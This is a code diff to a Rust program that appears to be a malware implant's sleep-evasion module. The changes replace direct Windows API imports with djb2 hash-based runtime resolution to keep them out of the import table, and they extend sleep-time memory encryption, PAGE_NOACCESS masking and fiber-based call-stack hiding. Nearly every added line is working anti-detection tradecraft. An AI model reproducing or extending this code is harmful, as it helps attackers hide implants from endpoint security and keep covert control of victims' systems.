@@ -6,6 +6,75 @@ use log::debug;
 use log::info;
 use rand::{thread_rng, Rng, RngCore as _};
 
+// ── Windows IAT-free constants ────────────────────────────────────────────────
+#[cfg(windows)]
+mod win_constants {
+    pub const PAGE_READWRITE: u32 = 0x04;
+    pub const PAGE_NOACCESS: u32  = 0x01;
+    pub const MEM_COMMIT: u32     = 0x1000;
+    pub const MEM_RESERVE: u32    = 0x2000;
+    pub const MEM_RELEASE: u32    = 0x8000;
+}
+#[cfg(windows)]
+use win_constants::*;
+
+// ── Windows pe_resolve helpers ────────────────────────────────────────────────
+#[cfg(windows)]
+mod win_resolve {
+    use anyhow::{anyhow, Result};
+
+    /// Compile-time djb2 hash for ASCII strings (matches pe_resolve::hash_str).
+    pub const fn hash_str_const(s: &[u8]) -> u32 {
+        let mut h: u32 = pe_resolve::SEED;
+        let mut i = 0;
+        while i < s.len() {
+            h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
+            i += 1;
+        }
+        h
+    }
+
+    pub const HASH_VIRTUALALLOC: u32   = hash_str_const(b"VirtualAlloc\0");
+    pub const HASH_VIRTUALFREE: u32    = hash_str_const(b"VirtualFree\0");
+    pub const HASH_VIRTUALPROTECT: u32 = hash_str_const(b"VirtualProtect\0");
+    pub const HASH_CONVERTTHREADTOFIBER: u32  = hash_str_const(b"ConvertThreadToFiber\0");
+    pub const HASH_CREATEFIBER: u32           = hash_str_const(b"CreateFiber\0");
+    pub const HASH_SWITCHTOFIBER: u32         = hash_str_const(b"SwitchToFiber\0");
+    pub const HASH_CONVERTFIBERTOTHREAD: u32  = hash_str_const(b"ConvertFiberToThread\0");
+    pub const HASH_DELETEFIBER: u32           = hash_str_const(b"DeleteFiber\0");
+    pub const HASH_SLEEP: u32                 = hash_str_const(b"Sleep\0");
+    pub const HASH_GETLOCALTIME: u32          = hash_str_const(b"GetLocalTime\0");
+
+    pub type FnVirtualAlloc   = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
+    pub type FnVirtualFree    = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32;
+    pub type FnVirtualProtect = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
+    pub type FnConvertThreadToFiber  = unsafe extern "system" fn(*mut std::ffi::c_void) -> *mut std::ffi::c_void;
+    pub type FnCreateFiber          = unsafe extern "system" fn(usize, Option<unsafe extern "system" fn(*mut std::ffi::c_void)>, *mut std::ffi::c_void) -> *mut std::ffi::c_void;
+    pub type FnSwitchToFiber        = unsafe extern "system" fn(*mut std::ffi::c_void);
+    pub type FnConvertFiberToThread = unsafe extern "system" fn() -> i32;
+    pub type FnDeleteFiber          = unsafe extern "system" fn(*mut std::ffi::c_void);
+    pub type FnSleep                = unsafe extern "system" fn(u32);
+    pub type FnGetLocalTime         = unsafe extern "system" fn(*mut winapi::um::minwinbase::SYSTEMTIME);
+
+    /// Resolve a kernel32 function by hash.
+    pub unsafe fn resolve_kernel32<T>(fn_hash: u32) -> Result<T> {
+        let module = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)
+            .ok_or_else(|| anyhow!("kernel32 not found"))?;
+        let addr = pe_resolve::get_proc_address_by_hash(module, fn_hash)
+            .ok_or_else(|| anyhow!("kernel32 API not found (hash 0x{:08X})", fn_hash))?;
+        Ok(std::mem::transmute_copy(&addr))
+    }
+}
+#[cfg(windows)]
+use win_resolve::*;
+
+// Static atomics for fn pointers used inside `extern "system"` fiber callbacks
+// that cannot capture local variables.
+#[cfg(windows)]
+static SLEEP_PTR: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+#[cfg(windows)]
+static SWITCHTOFIBER_PTR: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
+
 pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
     let mut base = config.base_interval_secs as f64;
     if let (Some(start), Some(end), Some(mult)) = (
@@ -34,7 +103,11 @@ pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
             #[cfg(windows)]
             {
                 let mut st: winapi::um::minwinbase::SYSTEMTIME = unsafe { std::mem::zeroed() };
-                unsafe { winapi::um::sysinfoapi::GetLocalTime(&mut st) };
+                let get_local_time: FnGetLocalTime = unsafe {
+                    win_resolve::resolve_kernel32(HASH_GETLOCALTIME)
+                        .expect("GetLocalTime resolve failed")
+                };
+                unsafe { get_local_time(&mut st) };
                 st.wHour as u32
             }
             #[cfg(not(any(unix, windows)))]
@@ -196,6 +269,14 @@ pub mod crypto {
         nonce: [u8; 12],
     }
 
+    // P2-05: Zeroize the nonce on drop to prevent lingering key material.
+    impl Drop for EncryptedSection {
+        fn drop(&mut self) {
+            use zeroize::Zeroize;
+            self.nonce.zeroize();
+        }
+    }
+
     thread_local! {
         /// Pointer to the mmap/VirtualAlloc'd key page.  Null when no session
         /// is active.  The key is stored at offset 0, 32 bytes long, on a page
@@ -235,10 +316,10 @@ pub mod crypto {
 
     #[cfg(windows)]
     unsafe fn alloc_key_page() -> (*mut u8, usize) {
-        use winapi::um::memoryapi::VirtualAlloc;
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
+        let virtual_alloc: FnVirtualAlloc = win_resolve::resolve_kernel32(HASH_VIRTUALALLOC)
+            .expect("VirtualAlloc resolve failed");
         let page_size = 4096usize;
-        let ptr = VirtualAlloc(
+        let ptr = virtual_alloc(
             std::ptr::null_mut(),
             page_size,
             MEM_COMMIT | MEM_RESERVE,
@@ -266,10 +347,12 @@ pub mod crypto {
         let _ = len;
         if !page.is_null() {
             std::ptr::write_volatile(page as *mut [u8; 32], [0u8; 32]);
-            winapi::um::memoryapi::VirtualFree(
-                page as *mut winapi::ctypes::c_void,
+            let virtual_free: FnVirtualFree = win_resolve::resolve_kernel32(HASH_VIRTUALFREE)
+                .expect("VirtualFree resolve failed");
+            virtual_free(
+                page as *mut std::ffi::c_void,
                 0,
-                winapi::um::winnt::MEM_RELEASE,
+                MEM_RELEASE,
             );
         }
     }
@@ -301,7 +384,9 @@ pub mod crypto {
         }
         #[cfg(not(feature = "direct-syscalls"))]
         {
-            if winapi::um::memoryapi::VirtualProtect(base_addr, region_size, new_protect, old_protect) == 0 {
+            let virtual_protect: FnVirtualProtect = win_resolve::resolve_kernel32(HASH_VIRTUALPROTECT)
+                .expect("VirtualProtect resolve failed");
+            if virtual_protect(base_addr, region_size, new_protect, old_protect) == 0 {
                 log::error!(
                     "VirtualProtect failed for {:p} (size={}): {}",
                     addr, size,
@@ -461,7 +546,7 @@ pub mod crypto {
                 if addr.is_null() || size == 0 { continue; }
 
                 let mut old_protect = 0u32;
-                if !protect_region(addr, size, winapi::um::winnt::PAGE_READWRITE, &mut old_protect) {
+                if !protect_region(addr, size, PAGE_READWRITE, &mut old_protect) {
                     continue;
                 }
 
@@ -483,7 +568,7 @@ pub mod crypto {
 
                 // Lock the section down to NOACCESS.
                 let mut temp = 0u32;
-                if !protect_region(addr, size, winapi::um::winnt::PAGE_NOACCESS, &mut temp) {
+                if !protect_region(addr, size, PAGE_NOACCESS, &mut temp) {
                     // Could not lock — undo the XOR so the section is sane again.
                     if protect_region(addr, size, old_protect, &mut temp) {
                         let mut key_copy2 = [0u8; 32];
@@ -546,7 +631,7 @@ pub mod crypto {
                 if section.addr.is_null() || section.size == 0 { continue; }
 
                 let mut rw_prev = 0u32;
-                if !protect_region(section.addr, section.size, winapi::um::winnt::PAGE_READWRITE, &mut rw_prev) {
+                if !protect_region(section.addr, section.size, PAGE_READWRITE, &mut rw_prev) {
                     std::ptr::write_volatile(&mut section.nonce as *mut _, [0u8; 12]);
                     continue;
                 }
@@ -756,7 +841,7 @@ pub mod stack_mask {
             if !super::crypto::protect_region(
                 addr,
                 size,
-                winapi::um::winnt::PAGE_READWRITE,
+                PAGE_READWRITE,
                 &mut orig_prot,
             ) {
                 continue;
@@ -778,7 +863,7 @@ pub mod stack_mask {
             let _ = super::crypto::protect_region(
                 addr,
                 size,
-                winapi::um::winnt::PAGE_NOACCESS,
+                PAGE_NOACCESS,
                 &mut dummy,
             );
             result.push(SectionEntry { addr, len: size, orig_prot, nonce });
@@ -801,7 +886,7 @@ pub mod stack_mask {
             if !super::crypto::protect_region(
                 section.addr,
                 section.len,
-                winapi::um::winnt::PAGE_READWRITE,
+                PAGE_READWRITE,
                 &mut dummy,
             ) {
                 core::ptr::write_volatile(&mut section.nonce, [0u8; 12]);
@@ -909,7 +994,22 @@ pub mod spoof {
         // Convert the current thread to a fiber so we can switch away from it.
         // This hides the current call stack during the sleep window.
         unsafe {
-            use winapi::um::winbase::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};
+            let convert_thread_to_fiber: FnConvertThreadToFiber =
+                win_resolve::resolve_kernel32(HASH_CONVERTTHREADTOFIBER)
+                    .expect("ConvertThreadToFiber resolve failed");
+            let create_fiber: FnCreateFiber =
+                win_resolve::resolve_kernel32(HASH_CREATEFIBER)
+                    .expect("CreateFiber resolve failed");
+            let switch_to_fiber: FnSwitchToFiber =
+                win_resolve::resolve_kernel32(HASH_SWITCHTOFIBER)
+                    .expect("SwitchToFiber resolve failed");
+            let sleep_fn: FnSleep =
+                win_resolve::resolve_kernel32(HASH_SLEEP)
+                    .expect("Sleep resolve failed");
+
+            // Store into static atomics for the fiber callback
+            SLEEP_PTR.store(sleep_fn as u64, std::sync::atomic::Ordering::SeqCst);
+            SWITCHTOFIBER_PTR.store(switch_to_fiber as u64, std::sync::atomic::Ordering::SeqCst);
 
             // Ensure the thread-local fiber guard is initialised so that
             // cleanup_fibers() runs when this thread exits.
@@ -920,7 +1020,7 @@ pub mod spoof {
             // Only convert once per thread
             let main_fiber = MAIN_FIBER.with(|f| f.get());
             let main_fiber = if main_fiber.is_null() {
-                let f = ConvertThreadToFiber(std::ptr::null_mut());
+                let f = convert_thread_to_fiber(std::ptr::null_mut());
                 if !f.is_null() {
                     MAIN_FIBER.with(|cell| cell.set(f));
                 }
@@ -942,19 +1042,25 @@ pub mod spoof {
                         loop {
                             let ns = SLEEP_DURATION_NS.with(|c| c.get());
                             if ns > 0 {
-                                // Sleep via NtDelayExecution-like spin using SleepEx
+                                // Sleep via dynamically-resolved kernel32 Sleep
                                 let ms = (ns / 1_000_000).max(1) as u32;
-                                winapi::um::synchapi::Sleep(ms);
+                                let sleep_fn: FnSleep = std::mem::transmute(
+                                    SLEEP_PTR.load(std::sync::atomic::Ordering::SeqCst)
+                                );
+                                sleep_fn(ms);
                             }
                             // Switch back to the main fiber
                             let main = MAIN_FIBER.with(|c| c.get());
                             if !main.is_null() {
-                                SwitchToFiber(main);
+                                let switch_fn: FnSwitchToFiber = std::mem::transmute(
+                                    SWITCHTOFIBER_PTR.load(std::sync::atomic::Ordering::SeqCst)
+                                );
+                                switch_fn(main);
                             }
                         }
                     }
                 }
-                let sf = CreateFiber(0, Some(sleep_fiber_proc), std::ptr::null_mut());
+                let sf = create_fiber(0, Some(sleep_fiber_proc), std::ptr::null_mut());
                 if !sf.is_null() {
                     SLEEP_FIBER.with(|cell| cell.set(sf));
                 }
@@ -971,8 +1077,8 @@ pub mod spoof {
             log::debug!("spoof_stack: switching to sleep fiber (main thread stack hidden)");
             // Switch to the sleep fiber — the current thread's call stack is
             // now hidden.  The sleep fiber will call Sleep() and then
-            // SwitchToFiber(main_fiber), which resumes execution right here.
-            SwitchToFiber(sleep_fiber);
+            // switch_to_fiber(main_fiber), which resumes execution right here.
+            switch_to_fiber(sleep_fiber);
             LAST_SWITCH_SUCCEEDED.with(|c| c.set(true));
             true
         }
@@ -1035,11 +1141,16 @@ thread_local! {
 pub fn cleanup_fibers() {
     #[cfg(windows)]
     {
-        use winapi::um::winbase::{ConvertFiberToThread, DeleteFiber};
+        let convert_fiber_to_thread: FnConvertFiberToThread =
+            unsafe { win_resolve::resolve_kernel32(HASH_CONVERTFIBERTOTHREAD)
+                .expect("ConvertFiberToThread resolve failed") };
+        let delete_fiber: FnDeleteFiber =
+            unsafe { win_resolve::resolve_kernel32(HASH_DELETEFIBER)
+                .expect("DeleteFiber resolve failed") };
         spoof::SLEEP_FIBER.with(|f| {
             let handle = f.get();
             if !handle.is_null() {
-                unsafe { DeleteFiber(handle) };
+                unsafe { delete_fiber(handle) };
                 f.set(std::ptr::null_mut());
             }
         });
@@ -1050,7 +1161,7 @@ pub fn cleanup_fibers() {
                 // makes the calling thread itself a fiber.  Release it via
                 // ConvertFiberToThread; DeleteFiber on the *current* fiber
                 // would terminate the thread.
-                unsafe { ConvertFiberToThread() };
+                unsafe { convert_fiber_to_thread() };
                 f.set(std::ptr::null_mut());
             }
         });
